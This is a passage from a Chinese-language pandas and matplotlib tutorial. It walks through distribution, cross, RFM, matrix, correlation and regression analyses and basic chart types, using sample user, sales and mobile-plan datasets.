1986/8/24 28 4 100010 2011/1/1 53042219860714031J 男 1986/7/14 28 1234ga = data.groupby( by='gender').id.agg('count')ga gender 女 4316 男 54785 Name: id, dtype: int64 12# 计算各分组的比例ga/ga.sum() gender 女 0.073028 男 0.926972 Name: id, dtype: float64 分布分析12data = pd.read_csv('../data/cnbook/第五章/5.5 分布分析/分布分析.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 用户ID 注册日期 身份证号码 性别 出生日期 年龄 0 100000 2011/1/1 15010219621116401I 男 1962/11/16 52 1 100001 2011/1/1 45092319910527539E 男 1991/5/27 23 2 100002 2011/1/1 35010319841017421J 男 1984/10/17 30 3 100006 2011/1/1 37110219860824751B 男 1986/8/24 28 4 100010 2011/1/1 53042219860714031J 男 1986/7/14 28 1234567# 根据年龄段分组bins = [0, 20, 30, 40, 100]data['年龄分层'] = pd.cut( data.年龄, bins)data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 用户ID 注册日期 身份证号码 性别 出生日期 年龄 年龄分层 0 100000 2011/1/1 15010219621116401I 男 1962/11/16 52 (40, 100] 1 100001 2011/1/1 45092319910527539E 男 1991/5/27 23 (20, 30] 2 100002 2011/1/1 35010319841017421J 男 1984/10/17 30 (20, 30] 3 100006 2011/1/1 37110219860824751B 男 1986/8/24 28 (20, 30] 4 100010 2011/1/1 53042219860714031J 男 1986/7/14 28 (20, 30] 1234aggResult = data.groupby( by='年龄分层',).用户ID.agg('count')aggResult 年龄分层 (0, 20] 2061 (20, 30] 46858 (30, 40] 8729 (40, 100] 1453 Name: 用户ID, dtype: int64 123# 计算各分组百分比temp = round(aggResult/aggResult.sum(), 4)*100temp.map('&#123;:,.2f&#125;%'.format) 年龄分层 (0, 20] 3.49% (20, 30] 79.28% (30, 40] 14.77% (40, 100] 2.46% Name: 用户ID, dtype: object 交叉分析pandas 实现透视表功能123456pandas.DataFrame.pivot_table(values, index, columns, aggfunc='mean', fill_value=None)values: 透视表中的值index: 透视表中的行columns: 透视表中的列aggfuc: 统计函数fill_value: NA 值统一的替换值 12data = pd.read_csv('../data/cnbook/第五章/5.6 交叉分析/交叉分析.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 用户ID 注册日期 身份证号码 性别 出生日期 年龄 0 100000 2011/1/1 15010219621116401I 男 1962/11/16 52 1 100001 2011/1/1 45092319910527539E 男 1991/5/27 23 2 100002 2011/1/1 35010319841017421J 男 1984/10/17 30 3 100006 2011/1/1 37110219860824751B 男 1986/8/24 28 4 100010 2011/1/1 53042219860714031J 男 1986/7/14 28 123bins = [0, 20, 30, 40, 100]data['年龄分层'] = pd.cut(data.年龄, bins)data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 用户ID 注册日期 身份证号码 性别 出生日期 年龄 年龄分层 0 100000 2011/1/1 15010219621116401I 男 1962/11/16 52 (40, 100] 1 100001 2011/1/1 45092319910527539E 男 1991/5/27 23 (20, 30] 2 100002 2011/1/1 35010319841017421J 男 1984/10/17 30 (20, 30] 3 100006 2011/1/1 37110219860824751B 男 1986/8/24 28 (20, 30] 4 100010 2011/1/1 53042219860714031J 男 1986/7/14 28 (20, 30] 1234567# 进行交叉分析data.pivot_table( values='用户ID', index='年龄分层', columns='性别', aggfunc='count') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 性别 女 男 年龄分层 (0, 20] 111 1950 (20, 30] 2903 43955 (30, 40] 735 7994 (40, 100] 567 886 RFM 分析12data = pd.read_csv('../data/cnbook/第五章/5.7 RFM分析/RFM分析.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } OrderID CustomerID DealDateTime Sales 0 4529 34858 2014-05-14 807 1 4532 14597 2014-05-14 160 2 4533 24598 2014-05-14 418 3 4534 14600 2014-05-14 401 4 4535 24798 2014-05-14 234 12data['DealDateTime'] = pd.to_datetime(data.DealDateTime, format='%Y/%m/%d')data.DealDateTime.dtype dtype(&apos;&lt;M8[ns]&apos;) 1234# 计算时间差data['DateDiff'] = datetime.now() - data['DealDateTime']data['DateDiff'] = data['DateDiff'].dt.daysdata.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } OrderID CustomerID DealDateTime Sales DateDiff 0 4529 34858 2014-05-14 807 1959 1 4532 14597 2014-05-14 160 1959 2 4533 24598 2014-05-14 418 1959 3 4534 14600 2014-05-14 401 1959 4 4535 24798 2014-05-14 234 1959 123456# 计算最近时间距离R_Agg = data.groupby( by='CustomerID', as_index=False).DateDiff.agg('min')R_Agg.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } CustomerID DateDiff 0 14568 1468 1 14569 1558 2 14570 1488 3 14571 1528 4 14572 1552 123456# 计算频率F_Agg = data.groupby( by='CustomerID', as_index=False).OrderID.agg('count')F_Agg.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } CustomerID OrderID 0 14568 15 1 14569 12 2 14570 15 3 14571 15 4 14572 8 123456# 计算金额M_Agg = data.groupby( by='CustomerID', as_index=False).Sales.agg('sum')M_Agg.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } CustomerID Sales 0 14568 6255 1 14569 5420 2 14570 8261 3 14571 8124 4 14572 3334 1234# 合并数据aggData = R_Agg.merge(F_Agg).merge(M_Agg)aggData.columns = ['CustomerID', 'RecencyAgg', 'FrequencyAgg', 'MonetaryAgg']aggData.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } CustomerID RecencyAgg FrequencyAgg MonetaryAgg 0 14568 1468 15 6255 1 14569 1558 12 5420 2 14570 1488 15 8261 3 14571 1528 15 8124 4 14572 1552 8 3334 12345678# 对 R、F、M 三个统计量进行得分计算# 按照大小顺序分成五组 # 1. 获取分割点，指定分组的百分位点，获取百分位点的值bins = aggData.RecencyAgg.quantile( q=[0, 0.2, 0.4, 0.6, 0.8, 1], interpolation='nearest')bins 0.0 1460 0.2 1467 0.4 1479 0.6 1494 0.8 1513 1.0 1725 Name: RecencyAgg, dtype: int64 1234567891011# 2. 根据百分位数对数据进行分段,指定每组对应的分数# 因为 cut 默认左开右闭，为了包含第一个数，设置为 0 bins[0] = 0# 用户越久没消费 R 值就越小，分之就越小rLabels = [5, 4, 3, 2, 1]R_S = pd.cut( aggData.RecencyAgg, bins=bins, labels=rLabels)R_S.head() 0 4 1 1 2 3 3 1 4 1 Name: RecencyAgg, dtype: category Categories (5, int64): [5 &lt; 4 &lt; 3 &lt; 2 &lt; 1] 1234567891011121314# 同样的原理求的 F 值bins = aggData.FrequencyAgg.quantile( q=[0, 0.2, 0.4, 0.6, 0.8, 1], interpolation='nearest')bins[0] = 0# 用户消费频次越高 F 值就越大，分之就越大fLabels = [1, 2, 3, 4, 5]F_S = pd.cut( aggData.FrequencyAgg, bins=bins, labels=fLabels)F_S.head() 0 4 1 2 2 4 3 4 4 1 Name: FrequencyAgg, dtype: category Categories (5, int64): [1 &lt; 2 &lt; 3 &lt; 4 &lt; 5] 1234567891011121314# 同样的原理求的 M 值bins = aggData.MonetaryAgg.quantile( q=[0, 0.2, 0.4, 0.6, 0.8, 1], interpolation='nearest')bins[0] = 0# 用户消费金额越高 M 值就越大，分之就越大mLabels = [1, 2, 3, 4, 5]M_S = pd.cut( aggData.MonetaryAgg, bins=bins, labels=mLabels)M_S.head() 0 3 1 2 2 4 3 4 4 1 Name: MonetaryAgg, dtype: category Categories (5, int64): [1 &lt; 2 &lt; 3 &lt; 4 &lt; 5] 1234aggData['R_S'] = R_SaggData['F_S'] = F_SaggData['M_S'] = M_SaggData.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } CustomerID RecencyAgg FrequencyAgg MonetaryAgg R_S F_S M_S 0 14568 1468 15 6255 4 4 3 1 14569 1558 12 5420 1 2 2 2 14570 1488 15 8261 3 4 4 3 14571 1528 15 8124 1 4 4 4 14572 1552 8 3334 1 1 1 12# 计算 RFM 得分，然后使用分为 八个 分组aggData['RFM'] = 100*R_S.astype(int) + 10*F_S.astype(int) + 1*M_S.astype(int) 1aggData.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } CustomerID RecencyAgg FrequencyAgg MonetaryAgg R_S F_S M_S RFM 0 14568 1468 15 6255 4 4 3 443 1 14569 1558 12 5420 1 2 2 122 2 14570 1488 15 8261 3 4 4 344 3 14571 1528 15 8124 1 4 4 144 4 14572 1552 8 3334 1 1 1 111 12345678910111213bins = aggData.RFM.quantile( q=[0, 0.125, 0.25, 0.375, 0.5, 0.625, 0.75, 0.875, 1], interpolation='nearest')bins[0] = 0# RFM 值越大，得分越高rfmLabels = [1, 2, 3, 4, 5, 6, 7, 8]aggData['level'] = pd.cut( aggData.RFM, bins, labels = rfmLabels)aggData.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } CustomerID RecencyAgg FrequencyAgg MonetaryAgg R_S F_S M_S RFM level 0 14568 1468 15 6255 4 4 3 443 6 1 14569 1558 12 5420 1 2 2 122 1 2 14570 1488 15 8261 3 4 4 344 5 3 14571 1528 15 8124 1 4 4 144 2 4 14572 1552 8 3334 1 1 1 111 1 至此， RFM 分析的计算就完成了，求解得到的 level 和客户类型的对应关系如下 R 值 F 值 M 值 客户类型 level 高 高 高 高价值客户 8 低 高 高 重点保持客户 7 高 低 高 重点发展客户 6 低 低 高 重点挽留客户 5 高 高 低 一般价值客户 4 低 高 低 一般保持客户 3 高 低 低 一般发展客户 2 低 低 低 潜在客户 1 最后我们看一下每个等级的人数 123aggData.groupby( by='level',)['CustomerID'].agg('count') level 1 153 2 164 3 135 4 153 5 154 6 142 7 151 8 148 Name: CustomerID, dtype: int64 矩阵分析12data = pd.read_csv('../data/cnbook/第五章/5.8 矩阵分析/矩阵分析.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 号码 省份 手机品牌 通信品牌 手机操作系统 月消费（元） 月流量（MB） 0 166547114238 河北 HTC 神州行 Android 298.9 318.6 1 166423353436 河南 HTC 神州行 Android 272.8 1385.9 2 166556915853 福建 HTC 神州行 Android 68.8 443.6 3 166434728749 湖南 HTC 神州行 Android 4.6 817.3 4 166544742252 北京 HTC 神州行 Android 113.2 837.4 123456# 按照省份分组，对月平均消费进行统计costAgg = data.groupby( by='省份', as_index=False)['月消费（元）'].agg('mean')costAgg.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 省份 月消费（元） 0 上海 152.927748 1 云南 148.100832 2 内蒙古 154.427736 3 北京 148.895912 4 台湾 146.081277 123456# 按照省份分组，对月平均流量进行统计dataAgg = data.groupby( by='省份', as_index=False)['月流量（MB）'].agg('mean')dataAgg.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 省份 月流量（MB） 0 上海 1025.075667 1 云南 985.382830 2 内蒙古 997.965655 3 北京 1010.642977 4 台湾 1014.620346 12aggData = costAgg.merge(dataAgg)aggData.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 省份 月消费（元） 月流量（MB） 0 上海 152.927748 1025.075667 1 云南 148.100832 985.382830 2 内蒙古 154.427736 997.965655 3 北京 148.895912 1010.642977 4 台湾 146.081277 1014.620346 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990# 画矩阵图from matplotlib import font_managerimport matplotlib.pyplot as plt# 生成字体属性，用来显示中文font = font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=10)labelFont = font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=15)# 蓝色，作为点的颜色mainColor = (91/255, 155/255, 213/255, 1)# 灰色，作为文本的颜色fontColor = (110/255, 110/255, 110/255, 1)# 新建一个绘图窗口fig = plt.figure()# 设置坐标轴的最大值最小值gap = 0.01xMin = aggData['月消费（元）'].min()*(1-gap)xMax = aggData['月消费（元）'].max()*(1+gap)yMin = aggData['月流量（MB）'].min()*(1-gap)yMax = aggData['月流量（MB）'].max()*(1+gap)# 设置 x 轴和 y 轴的坐标轴范围plt.xlim(xMin, xMax)plt.ylim(yMin, yMax)# 设置刻度，这里设置为空plt.xticks([])plt.yticks([])# 绘制散点图plt.scatter( aggData['月消费（元）'], aggData['月流量（MB）'], s=100, # 设置点的大小 marker='o', # 设置点的样式 color=mainColor # 设置点的颜色)# 设置坐标轴的标签plt.xlabel( '人均月消费（元）', color=fontColor, fontproperties=labelFont)plt.ylabel( '人均月流量（MB）', color=fontColor, fontproperties=labelFont)# 绘制分割线# 竖线plt.vlines( x=data['月消费（元）'].mean(), ymin=yMin, ymax=yMax, linewidth=1, color=mainColor)# 横线plt.hlines( y=data['月流量（MB）'].mean(), xmin=xMin, xmax=xMax, linewidth=1, color=mainColor)# 标记象限plt.text(xMax-0.5, yMax-5, 'I', color=fontColor, fontsize=15)plt.text(xMin, yMax-5, 'II', color=fontColor, fontsize=15)plt.text(xMin, yMin, 'III', color=fontColor, fontsize=15)plt.text(xMax-0.6, yMin, 'IV', color=fontColor, fontsize=15)# 添加省标签for i, r in aggData.iterrows(): plt.text( r['月消费（元）'] + 0.25, r['月流量（MB）'] - 1, r['省份'], color=fontColor, fontproperties=font )plt.show() 相关分析研究的是两个变量之间的相互关系，计算相关系数 12data = pd.read_csv('../data/cnbook/第五章/5.9 相关分析/相关分析.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 小区ID 人口 平均收入 文盲率 超市购物率 网上购物率 本科毕业率 0 1 3615 3624 2.1 15.1 84.9 41.3 1 2 365 6315 1.5 11.3 88.7 66.7 2 3 2212 4530 1.8 7.8 92.2 58.1 3 4 2110 3378 1.9 10.1 89.9 39.9 4 5 21198 5114 1.1 10.3 89.7 62.6 12# 计算人口和文盲率的相关性data['人口'].corr(data['文盲率']) 0.10762237339473261 12# 计算 超市购物率、网上购物率、文盲率、人口 之间的相关性data[['超市购物率', '网上购物率', '文盲率', '人口']].corr() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 超市购物率 网上购物率 文盲率 人口 超市购物率 1.000000 -1.000000 0.702975 0.343643 网上购物率 -1.000000 1.000000 -0.702975 -0.343643 文盲率 0.702975 -0.702975 1.000000 0.107622 人口 0.343643 -0.343643 0.107622 1.000000 回归分析简单线性回归分析一元线性回归Y = a + bX + e e 为误差 12data = pd.read_csv('../data/cnbook/第五章/5.10.2 简单线性回归分析/线性回归.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 月份 广告费用(万元) 销售额(万元) 0 201601 29.7 802.4 1 201602 25.7 725.0 2 201603 20.6 620.5 3 201604 17.0 587.0 4 201605 10.9 505.0 1. 根据预测目标，确定自变量因变量1234# 自变量 x = data[['广告费用(万元)']]# 因变量y = data[['销售额(万元)']] 2. 绘制散点图，确定回归模型类型12# 绘制散点图data.plot('广告费用(万元)', '销售额(万元)', kind='scatter') &lt;matplotlib.axes._subplots.AxesSubplot at 0x11942fe10&gt; 12# 计算相关系数data['广告费用(万元)'].corr(data['销售额(万元)']) 0.9377748050928367 3. 估计模型参数，建立回归模型从散点图中可以看出两者有明显的线性关系，但是这些数据点不在一条直线上，只能尽可能拟合出一条直线，使得尽可能多的数据点落在或者更加靠近这条拟合出来的直线上，也就是让它们拟合的误差尽量小，最小二乘法就是一个较好的计算方法。 1234567from sklearn.linear_model import LinearRegression# 建立模型lrModel = LinearRegression()# 使用自变量 x 和因变量 y 训练模型lrModel.fit(x, y)# 查看 回归系数、截距lrModel.coef_, lrModel.intercept_ (array([[17.31989665]]), array([291.90315808])) 4. 对回归模型进行检验精度，就是用来表示点和回归模型的拟合程度的指标，一般使用判定系数 R^2 来度量回归模型拟合精度，也称拟合优度或决定系数，在简单线性回归模型中，它的值等于 y 值和模型计算出来的 y’ 值的相关系数 R 的平方，用来表示拟合得到的模型能够解释因变量变化的百分比，R^2 越接近 1， 表示回归模型拟合效果越好。 12# 计算模型的精度lrModel.score(x, y) 0.8794215850669082 可以看到拟合效果还是非常不错的 5. 利用回归模型进行预测123# 生成预测需要的自变量pX = pd.DataFrame(&#123;'广告费':[20]&#125;)lrModel.predict(pX) array([[638.30109101]]) 多重线性回归分析就是多个自变量的线性回归，分析方法和简单线性相似 12data = pd.read_csv('../data/cnbook/第五章/5.10.3 多重线性回归分析/线性回归.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 月份 广告费用(万元) 客流量(万人次) 销售额(万元) 0 201601 29.7 14.8 802.4 1 201602 25.7 12.6 725.0 2 201603 20.6 9.9 620.5 3 201604 17.0 7.6 587.0 4 201605 10.9 5.1 505.0 根据预测目标，确定自变量和因变量1234# 定义自变量x = data[['广告费用(万元)', '客流量(万人次)']]# 定义因变量y = data[['销售额(万元)']] 绘制散点图，确定回归模型类型1data.plot('广告费用(万元)', '销售额(万元)', kind='scatter') &lt;matplotlib.axes._subplots.AxesSubplot at 0x125e2fe10&gt; 1data['广告费用(万元)'].corr(data['销售额(万元)']) 0.9377748050928367 1data.plot('客流量(万人次)', '销售额(万元)', kind='scatter') &lt;matplotlib.axes._subplots.AxesSubplot at 0x12654ac18&gt; 1data['客流量(万人次)'].corr(data['销售额(万元)']) 0.9213105695705346 估计模型参数，建立线性回归模型123456from sklearn.linear_model import LinearRegression# 创建线性回归模型lrModel = LinearRegression()lrModel.fit(x, y)# 查看 回归系数、截距lrModel.coef_, lrModel.intercept_ (array([[10.80453641, 13.97256004]]), array([285.60371828])) 对回归模型进行检验1lrModel.score(x, y) 0.9026563046475117 拟合效果非常不错 利用回归模型进行预测123456# 生成预测需要的自变量pX = pd.DataFrame(&#123; '广告费':[20], '客流量':[5]&#125;)pX .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 广告费 客流量 0 20 5 12# 用模型进行预测lrModel.predict(pX) array([[571.55724658]]) 数据可视化散点图12data = pd.read_csv('../data/cnbook/第六章/6.2 散点图/散点图.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 日期 购买用户数 广告费用 促销 渠道数 0 2014/1/1 2496 9.14 否 6 1 2014/1/2 2513 9.47 否 8 2 2014/1/3 2228 6.31 是 4 3 2014/1/4 2336 6.41 否 2 4 2014/1/5 2508 9.05 是 5 123import matplotlibimport matplotlib.pyplot as pltplt.scatter(data['广告费用'], data['购买用户数']) &lt;matplotlib.collections.PathCollection at 0x12652dd68&gt; 颜色设置1234567# 设置 rgbmainColor = (91/255, 155/255, 213/255, 1)plt.scatter( data['广告费用'], data['购买用户数'], color=mainColor) &lt;matplotlib.collections.PathCollection at 0x129083080&gt; 坐标轴设置12345678910111213141516# 创建字体，用来显示中文font = matplotlib.font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=10)# 设置坐标轴标签以及颜色和字体plt.xlabel( '广告费用', color=mainColor, fontproperties=font)plt.ylabel( '购买用户数', color=mainColor, fontproperties=font) Text(0, 0.5, &apos;购买用户数&apos;) 123456789# 设置刻度样式plt.xticks( color=mainColor, fontproperties=font)plt.yticks( color=mainColor, fontproperties=font) (array([0. , 0.2, 0.4, 0.6, 0.8, 1. ]), &lt;a list of 6 Text yticklabel objects&gt;) 散点样式设置1234567891011121314151617181920# 打开一个新的绘图窗口plt.figure()# 粉色，作为促销的点的颜色pinkColor = (255/255, 0/255, 102/255, 1)# 蓝色，作为不促销的点的颜色blueColor = (91/255, 155/255, 213/255, 1)# 绘制促销的点plt.scatter( data[data['促销'] == '是']['广告费用'], data[data['促销'] == '是']['购买用户数'], color=pinkColor, marker='o' # 点样式)# 绘制不促销的点plt.scatter( data[data['促销'] == '否']['广告费用'], data[data['促销'] == '否']['购买用户数'], color=blueColor, marker='x' # 点样式) &lt;matplotlib.collections.PathCollection at 0x1291f04a8&gt; 添加图例1plt.legend(labels=['促销', '不促销'], prop=font) &lt;matplotlib.legend.Legend at 0x129474a90&gt; 完整绘图示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 打开一个新的绘图窗口plt.figure()# 创建字体，用来显示中文font = matplotlib.font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=10)# 粉色，作为促销的点的颜色pinkColor = (255/255, 0/255, 102/255, 1)# 蓝色，作为不促销的点的颜色blueColor = (91/255, 155/255, 213/255, 1)# 绘制促销的点plt.scatter( data[data['促销'] == '是']['广告费用'], data[data['促销'] == '是']['购买用户数'], color=pinkColor, marker='o' # 点样式)# 绘制不促销的点plt.scatter( data[data['促销'] == '否']['广告费用'], data[data['促销'] == '否']['购买用户数'], color=blueColor, marker='x' # 点样式)# 设置坐标轴标签以及颜色和字体plt.xlabel( '广告费用', color=mainColor, fontproperties=font)plt.ylabel( '购买用户数', color=mainColor, fontproperties=font)# 设置刻度样式plt.xticks( color=mainColor, fontproperties=font)plt.yticks( color=mainColor, fontproperties=font)# 添加图例plt.legend(labels=['促销', '不促销'], prop=font) &lt;matplotlib.legend.Legend at 0x12951bc88&gt; 矩阵图参考之前的矩阵分析绘图部分 折线图12data = pd.read_csv('../data/cnbook/第六章/6.4 折线图/折线图.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id reg_date id_num gender birthday 0 109899 2011-02-01 35042519920219007J 男 1992/2/19 1 109903 2011-02-01 43048119891223411D 男 1989/12/23 2 109904 2011-02-01 42010219880201313H 男 1988/2/1 3 109905 2011-02-01 44030619840213001E 男 1984/2/13 4 109906 2011-02-01 43070219870502103H 男 1987/5/2 1234567891011data['reg_date'] = pd.to_datetime( data['reg_date'])# 按照注册日期进行分组，按照 id 列进行计数统计ga =data.groupby( by='reg_date', as_index=False)['id'].agg('count')ga.columns = ['注册日期', '注册用户数']ga.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 注册日期 注册用户数 0 2011-02-01 282 1 2011-02-02 272 2 2011-02-03 264 3 2011-02-04 256 4 2011-02-05 256 123456789101112131415161718192021222324252627import matplotlibfrom matplotlib import pyplot as pltmainColor = (91/255, 155/255, 213/255, 1)# 坐标轴刻度的字体font = matplotlib.font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=10)# 坐标轴标签的字体labelFont = matplotlib.font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=20)# 设置 y 轴显示的范围plt.ylim(0, 500)# 设置标题plt.title('注册用户数', color=mainColor, fontproperties=labelFont)# 设置 x、y 轴的标签plt.xlabel('注册日期', color=mainColor, fontproperties=labelFont)plt.xlabel('注册用户数', color=mainColor, fontproperties=labelFont)# 设置坐标轴刻度样式plt.xticks(color=mainColor, fontproperties=font)plt.yticks(color=mainColor, fontproperties=font)# 绘制折线图 lw 设置线的宽度plt.plot(ga['注册日期'], ga['注册用户数'], '-', lw=5, color=mainColor) [&lt;matplotlib.lines.Line2D at 0x12a557438&gt;] 饼图1ga = pd.Series(&#123;'男':54785, '女':4316&#125;) 1ga 男 54785 女 4316 dtype: int64 123456789101112131415161718import matplotlibfrom matplotlib import pyplot as pltfemaleColor = (91/255, 155/255, 213/255, 0.5)maleColor = (91/255, 155/255, 213/255, 1)# 坐标轴刻度的字体font = matplotlib.font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=10)# 设置为圆形的饼图plt.axis('equal')plt.pie( ga, labels=['男', '女'], colors=[maleColor, femaleColor], autopct='%.1f%%', # 设置百分号 textprops=&#123;'fontproperties':font&#125;) ([&lt;matplotlib.patches.Wedge at 0x1484e9748&gt;, &lt;matplotlib.patches.Wedge at 0x1484e9e48&gt;], [Text(-1.0711775990020538, 0.25015705346081196, &apos;男&apos;), Text(1.0711775814360058, -0.2501571286789748, &apos;女&apos;)], [Text(-0.5842786903647565, 0.1364493018877156, &apos;92.7%&apos;), Text(0.5842786807832758, -0.13644934291580443, &apos;7.3%&apos;)]) 柱状图12data = pd.read_csv('../data/cnbook/第六章/6.6 柱形图/柱形图.csv')data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 号码 省份 手机品牌 通信品牌 手机操作系统 月消费（元） 月流量（MB） 0 166547114238 河北 HTC 神州行 Android 298.9 318.6 1 166423353436 河南 HTC 神州行 Android 272.8 1385.9 2 166556915853 福建 HTC 神州行 Android 68.8 443.6 3 166434728749 湖南 HTC 神州行 Android 4.6 817.3 4 166544742252 北京 HTC 神州行 Android 113.2 837.4 123456# 统计每个品牌的消费总额result = data.groupby( by='手机品牌', as_index=False)['月消费（元）'].agg('sum')result.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 手机品牌 月消费（元） 0 HTC 458171.6 1 三星 1009290.8 2 华为 25696.0 3 摩托罗拉 117623.1 4 联想 89443.7 12345678910111213141516171819202122import matplotlibfrom matplotlib import pyplot as pltplt.figure()# 生成 x 轴的位置, 赋值给 indexindex = [1, 2, 3, 4, 5, 6, 7, 8]# 配置颜色mainColor = (91/255, 155/255, 213/255, 1)# 设置字体font = matplotlib.font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=10)# 排序sgb = result.sort_values(by='月消费（元）', ascending=False)plt.bar( index, sgb['月消费（元）'], color=mainColor)# 设置 x 轴刻度plt.xticks(index, sgb.手机品牌, fontproperties=font) ([&lt;matplotlib.axis.XTick at 0x148504470&gt;, &lt;matplotlib.axis.XTick at 0x129caaa20&gt;, &lt;matplotlib.axis.XTick at 0x129caada0&gt;, &lt;matplotlib.axis.XTick at 0x129cce630&gt;, &lt;matplotlib.axis.XTick at 0x1484fcac8&gt;, &lt;matplotlib.axis.XTick at 0x129cce828&gt;, &lt;matplotlib.axis.XTick at 0x129cd1390&gt;, &lt;matplotlib.axis.XTick at 0x129cd4198&gt;], &lt;a list of 8 Text xticklabel objects&gt;) 条形图12345678910111213141516171819202122import matplotlibfrom matplotlib import pyplot as pltplt.figure()# 生成 y 轴的位置, 赋值给 indexindex = [1, 2, 3, 4, 5, 6, 7, 8]# 配置颜色mainColor = (91/255, 155/255, 213/255, 1)# 设置字体font = matplotlib.font_manager.FontProperties( fname='../data/cnbook/SourceHanSansCN-Light.otf', size=10)# 排序sgb = result.sort_values(by='月消费（元）', ascending=True)plt.barh( index, sgb['月消费（元）'], color=mainColor)# 设置 x 轴刻度plt.yticks(index, sgb.手机品牌, fontproperties=font) ([&lt;matplotlib.axis.YTick at 0x14872aeb8&gt;, &lt;matplotlib.axis.YTick at 0x14872a828&gt;, &lt;matplotlib.axis.YTick at 0x14873beb8&gt;, &lt;matplotlib.axis.YTick at 0x148761940&gt;, &lt;matplotlib.axis.YTick at 0x148761e10&gt;, &lt;matplotlib.axis.YTick at 0x1487cc320&gt;, &lt;matplotlib.axis.YTick at 0x1487cc7f0&gt;, &lt;matplotlib.axis.YTick at 0x148761a20&gt;], &lt;a list of 8 Text yticklabel objects&gt;) 12]]></content>
      <categories>
        <category>数据分析</category>
      </categories>
      <tags>
        <tag>数据分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pandas 基础]]></title>
    <url>%2F2019%2F05%2F07%2F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%2Fpandas%20%E5%9F%BA%E7%A1%80%2F</url>
